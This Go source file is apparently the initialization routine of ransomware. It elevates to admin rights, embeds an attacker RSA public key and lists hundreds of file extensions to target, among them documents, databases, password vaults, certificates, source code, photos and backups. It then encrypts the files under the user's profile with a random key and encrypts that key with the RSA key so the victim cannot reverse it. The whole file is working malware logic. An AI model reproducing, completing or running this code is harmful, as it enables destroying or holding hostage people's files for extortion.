package main

import (
	"crypto/rand"
	"fmt"
	"os"
)

func initialize() {

	// Need to check if we are an admin first. If we are not, re-run as admin, and close out this process.
	if !AmAdmin() {
		fmt.Println("Elevating Privileges...")
		ElevateMe()
	}

	const pubPEM = `
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcMcLEUzBFFsNGaTW80d
obhQIGiieuP9C+h/SLx/WGFhwFYBDp5mk6ywwejwVDBr+6ulUXISabEKnOerqo4u
09wussaLmA0fje1Kipil9Fr9exRQ3oFQxdjcEvraCj7u/WEeu0w1Mg+d/AN8d6Zl
POzkS5l+cv4RnjKEiyGnVdrBUtuNKK2dEsexCjjMHn7XJp16Msc9gt6AneK40Nog
Y8MW5yRjXMBpAanA688h9HvA0CewXNju5V0ouS+dHCPWDTHX41Erv72rsDQiz7Vq
OpRDAU7mi2Xgt+njdHcDtZleaZiwIhbDo8SR6LVFossHsNCCoA0nLS9wp8qPwxEH
gwIDAQAB
-----END PUBLIC KEY-----`

	targets := []string{".wb2", ".psd", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".pl", ".py", ".lua", ".css", ".js", ".asp", ".php", ".incpas", ".asm", ".hpp", ".h", ".cpp", ".c", ".7z", ".zip", ".rar", ".drf", ".blend", ".apj", ".3ds", ".dwg", ".sda", ".ps", ".pat", ".fxg", ".fhd", ".fh", ".dxb", ".drw", ".design", ".ddrw", ".ddoc", ".dcs", ".csl", ".csh", ".cpi", ".cgm", ".cdx", ".cdrw", ".cdr6", ".cdr5", ".cdr4", ".cdr3", ".cdr", ".awg", ".ait", ".ai", ".agd1", ".ycbcra", ".x3f", ".stx", ".st8", ".st7", ".st6", ".st5", ".st4", ".srw", ".srf", ".sr2", ".sd1", ".sd0", ".rwz", ".rwl", ".rw2", ".raw", ".raf", ".ra2", ".ptx", ".pef", ".pcd", ".orf", ".nwb", ".nrw", ".nop", ".nef", ".ndd", ".mrw", ".mos", ".mfw", ".mef", ".mdc", ".kdc", ".kc2", ".iiq", ".gry", ".grey", ".gray", ".fpx", ".fff", ".exf", ".erf", ".dng", ".dcr", ".dc2", ".crw", ".craw", ".cr2", ".cmt", ".cib", ".ce2", ".ce1", ".arw", ".3pr", ".3fr", ".mpg", ".jpeg", ".jpg", ".mdb", ".sqlitedb", ".sqlite3", ".sqlite", ".sql", ".sdf", ".sav", ".sas7bdat", ".s3db", ".rdb", ".psafe3", ".nyf", ".nx2", ".nx1", ".nsh", ".nsg", ".nsf", ".nsd", ".ns4", ".ns3", ".ns2", ".myd", ".kpdx", ".kdbx", ".idx", ".ibz", ".ibd", ".fdb", ".erbsql", ".db3", ".dbf", ".db-journal", ".db", ".cls", ".bdb", ".al", ".adb", ".backupdb", ".bik", ".backup", ".bak", ".bkp", ".moneywell", ".mmw", ".ibank", ".hbk", ".ffd", ".dgc", ".ddd", ".dac", ".cfp", ".cdf", ".bpw", ".bgt", ".acr", ".ac2", ".ab4", ".djvu", ".pdf", ".sxm", ".odf", ".std", ".sxd", ".otg", ".sti", ".sxi", ".otp", ".odg", ".odp", ".stc", ".sxc", ".ots", ".ods", ".sxg", ".stw", ".sxw", ".odm", ".oth", ".ott", ".odt", ".odb", ".csv", ".rtf", ".accdr", ".accdt", ".accde", ".accdb", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".potm", ".potx", ".pptm", ".pptx", ".pps", ".pot", ".ppt", ".xlw", ".xll", ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt", ".xls", ".xml", ".dotm", ".dotx", ".docm", ".docx", ".dot", ".doc", ".txt"}

	publicRSAKey := savePublicKey(pubPEM)
	encryptionKey := make([]byte, 32)
	_, err := rand.Read(encryptionKey)
	checkError(err)

	// Change the root directory. Only used this for testing.
	files := EncryptSystem(os.Getenv("USERPROFILE"), targets, encryptionKey)

	// Encrypt the key so that it can't be reversed.
	encryptionKey = EncryptDataRSA(publicRSAKey, encryptionKey)
	for _, f := range files {
		fmt.Println(f)
	}
}
